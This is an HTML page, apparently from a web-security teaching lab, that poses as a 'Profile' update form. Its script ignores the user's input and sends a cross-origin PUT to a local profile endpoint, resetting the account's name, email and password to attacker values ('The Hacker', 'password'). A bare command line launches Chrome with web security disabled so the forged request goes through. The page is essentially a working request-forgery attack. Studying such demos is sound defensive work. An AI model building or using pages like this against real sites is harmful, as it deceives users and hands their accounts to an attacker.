<!DOCTYPE html>
<html data-lt-installed="true"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>WebApp</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootswatch@5.1.0/dist/flatly/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400&amp;display=swap">
    <link rel="stylesheet" href="http://localhost:8080/assets/css/styles.css">
</head>

<body>
    <div class="container" style="display:flex;flex-direction:column;justify-content:center;">
        <div class="page-header">
            <h2 class="text-center"><strong>Profile</strong></h2>
        </div>
        <form id="form" method="post">
            <div class="form-group mb-3"><input class="form-control" type="text" name="name" placeholder="Name" value="Andreas Martin"></div>
            <div class="form-group mb-3"><input class="form-control" type="email" name="email" placeholder="Email" value="andreas.martin@fhnw.ch"></div>
            <div class="form-group mb-3"><input class="form-control" type="password" name="password" placeholder="Password"></div>
            <div class="form-group mb-3"><button class="btn btn-primary d-block w-100" type="submit">Update</button></div>
        </form>
    </div>
    <div class="modal fade" role="dialog" tabindex="-1" id="error-modal">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header" style="background-color: #e85e6c;">
                    <h1 class="text-white">Ooops!</h1><button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p class="text-truncate text-primary" id="error-text"></p>
                </div>
                <div class="modal-footer"><button class="btn btn-warning d-block w-100" type="button" data-bs-dismiss="modal">Try Again</button></div>
            </div>
        </div>
    </div>
    .\chrome.exe --disable-web-security
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function () {
            $("#form").submit(function (event) {
                    $.ajax({
                        crossDomain: true,
                        type: "PUT",
                        contentType: "application/json",
                        url: "http://localhost:8080/profile",
                        data: JSON.stringify({
                            name: "The Hacker",
                            email: "hacked@hacked.com",
                            password: "password",
                        }),
                    });
                    event.preventDefault();
            });
        });
    </script>


</body></html>
